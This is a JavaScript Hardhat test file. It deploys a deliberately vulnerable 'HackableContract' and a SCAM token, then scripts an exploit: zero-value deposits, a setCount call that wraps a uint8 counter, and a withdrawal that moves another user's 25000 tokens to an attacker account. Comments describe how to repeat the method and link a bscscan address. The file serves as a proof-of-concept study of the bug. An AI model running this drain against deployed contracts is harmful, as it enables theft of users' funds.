// ethers is global variable here.

const { expect } = require("chai");
const { expectRevert } = require('@openzeppelin/test-helpers');

const airDropSize = "1000000000000000000000000";
// 1000000000000000000000000 / 10 ** 18
// 1000000

const humanReadableUnixTimestamp = (timestampInt) => {
  return new Date(timestampInt * 1000);
}

// function sleep(seconds) {
//   var waitUntil = new Date().getTime() + seconds * 1000;
//   while (new Date().getTime() < waitUntil) true;
// }


describe("SCAMToken state and transactions", function () {
  let SCAMToken, scamToken, owner, hacker;

  let someoneDespoitScamEvent;
  let withdrawScamEvent;
  let setCountEvent;

  beforeEach(async () => {
    provider = ethers.getDefaultProvider();

    SCAMToken = await ethers.getContractFactory("SCAM_Token");
    scamToken = await SCAMToken.deploy();

    HackableContract = await ethers.getContractFactory("HackableContract");
    hackableContract = await HackableContract.deploy();

    HackableContractDrain = await ethers.getContractFactory("HackableContractDrain");
    hackableContractDrain = await HackableContractDrain.deploy(hackableContract.address, scamToken.address);

    // For any reason, deposit SCAM fail with owner
    // I will use airDrop for despotior to help him to have SCAM first (25000) for HackableContract
    [owner, depositor, firstComer, secondComer, hacker, anotherHacker, _] = await ethers.getSigners();

    someoneDespoitScamEvent = new Promise((resolve, reject) => {
      hackableContract.on('SomeoneDepositScam', (when, event) => {
        event.removeListener();

        resolve({
          when,
        });
      });

      setTimeout(() => {
        reject(new Error('timeout'));
      }, 60000)
    });

    setCountEvent = new Promise((resolve, reject) => {
      hackableContract.on('SetCount', (when, event) => {
        event.removeListener();

        resolve({
          when,
        });
      });

      setTimeout(() => {
        reject(new Error('timeout'));
      }, 60000)
    });

    withdrawScamEvent = new Promise((resolve, reject) => {
      hackableContract.on('WithdrawScam', (amount, event) => {
        event.removeListener();

        resolve({
          amount,
        });
      });

      setTimeout(() => {
        reject(new Error('timeout'));
      }, 60000)
    });
  });

  // Owner should have already deposited with 0x20f4
  // https://bscscan.com/address/0xaa57213f5c0154619713537e99b8dfd923c6e3ef
  // it("Should test 'deposit' from owner with 25000 $SCAM first", async function () {
  //   const origin = owner.address;
  //   const amount = 25000;
  //   console.log("owner:", amount);

  //   await hackableContract.DepositScam(origin, amount);
  // });

  // Hacker
  it("Should test 'deposit' from hacker with 0 $SCAM so to verify that we don't need the real $SCAM to test this.", async function () {
    await scamToken.airdropTokens(depositor.address);
    const depsitorBalance = await scamToken.balanceOf(depositor.address);
    expect(depsitorBalance.toString()).to.equal(airDropSize);

    const zeroCount = await hackableContract.count();
    console.log("None deposited: ", zeroCount);

    // Make a function to see these.
    // console.log(await hackableContract.addressRegistered())
    // console.log(await hackableContract.addressToId())
    // console.log(await hackableContract.balances())

    const amountToDeposit = 25000;
    await scamToken.connect(depositor).approve(hackableContract.address, amountToDeposit); // Should be called by depositor first

    await hackableContract.depositScam(depositor.address, amountToDeposit);

    let event = await someoneDespoitScamEvent;
    console.log("SomeoneDepositScam");
    console.log(humanReadableUnixTimestamp(event.when.toString()));

    let count = await hackableContract.count();
    console.log("Someone deposited: ", count);

    await hackableContract.connect(hacker).depositScam(firstComer.address, 0);
    event = await someoneDespoitScamEvent;
    console.log("SomeoneDepositScam");
    console.log(humanReadableUnixTimestamp(event.when.toString()));

    count = await hackableContract.count();
    console.log("Firstcomer deposited: ", count);

    // console.log("wait");
    // sleep(2);

    // Caller should be different for easy testing.
    await hackableContract.connect(secondComer).depositScam(secondComer.address, 0);
    event = await someoneDespoitScamEvent;
    console.log("SomeoneDepositScam");
    console.log(humanReadableUnixTimestamp(event.when.toString()));

    count = await hackableContract.count();
    console.log("Hacker deposited: ", count);

    // Our purpose is to take control of count manually
    // Say he repeated instead of setCount with the hack contract later.
    await hackableContract.connect(hacker).setCount(255);
    event = await setCountEvent;
    console.log("SetCount");
    console.log(humanReadableUnixTimestamp(event.when.toString()));

    count = await hackableContract.count();
    console.log("Hacker could set count to uint8 start value again: ", count);

    await hackableContract.connect(hacker).depositScam(hacker.address, 0);
    event = await someoneDespoitScamEvent;
    console.log("SomeoneDepositScam");
    console.log(humanReadableUnixTimestamp(event.when.toString()));

    count = await hackableContract.count();
    console.log("Hacker deposited: ", count);

    await hackableContract.connect(anotherHacker).depositScam(anotherHacker.address, 0);
    event = await someoneDespoitScamEvent;
    console.log("SomeoneDepositScam");
    console.log(humanReadableUnixTimestamp(event.when.toString()));

    count = await hackableContract.count();
    console.log("Hacker deposited and count is ", count);

    await hackableContract.connect(anotherHacker).withdrawScam(amountToDeposit);
    event = await withdrawScamEvent;
    console.log("WithdrawScam");
    console.log("amount: ", event.amount.toString());
    console.log(humanReadableUnixTimestamp(event.amount.toString()));

    const hackerBalance = await scamToken.balanceOf(anotherHacker.address);
    console.log("Payload: ", hackerBalance.toString()); 
  });
});

// // This is difficult to test with the same account.
// const max = 256;
// const i8 = [...Array(max).keys()];

// // https://oieduardorabelo.medium.com/javascript-armadilhas-do-asyn-await-em-loops-1cdad44db7f0
// // https://www.techiedelight.com/initialize-array-with-range-from-0-to-n-javascript/
// // https://stackoverflow.com/questions/951021/what-is-the-javascript-version-of-sleep

// // const promises = i8.map(async (_value, index) => {
// //     if (index % 2 === 0) {
// //       await hackableContract.connect(hacker).DepositScam(hacker.address, 0);
// //       event = await someoneDespoitScamEvent;
// //       console.log("SomeoneDepositScam");
// //       console.log(humanReadableUnixTimestamp(event.when.toString()));

// //       count = await hackableContract.Count();
// //       console.log("Hacker deposited again: ", count);
// //     } else {
// //       await hackableContract.connect(secondComer).DepositScam(secondComer.address, 0);
// //       event = await someoneDespoitScamEvent;
// //       console.log("SomeoneDepositScam");
// //       console.log(humanReadableUnixTimestamp(event.when.toString()));

// //       count = await hackableContract.Count();
// //       console.log("Hacker deposited again: ", count);
// //     }
// //   }
// // );

// // await Promise.all(promises);

// const targetCount = await hackableContract.Count();
// console.log("Target count:", targetCount);

// This should be done with account or a contract deployed.
// 1. You don't need to send a SCAM. You can use it without allow with 0.
// 2. I just need to make the count from 1 to 1 again and when that happens I use the account with mine.
// 3. We can see the count value easily so we can stop when it becomes 1 again.

// Make a function to see these.
// console.log(await hackableContract.addressRegistered())
// console.log(await hackableContract.addressToId())
// console.log(await hackableContract.balances())

// Should be contract with the loop later to save the cost

// for (let index = 0; index < 256; index++) {
//   await hackableContract.DepositScam(hacker.address, );
//   const count = await hackableContract.Count();
//   console.log(count);
// }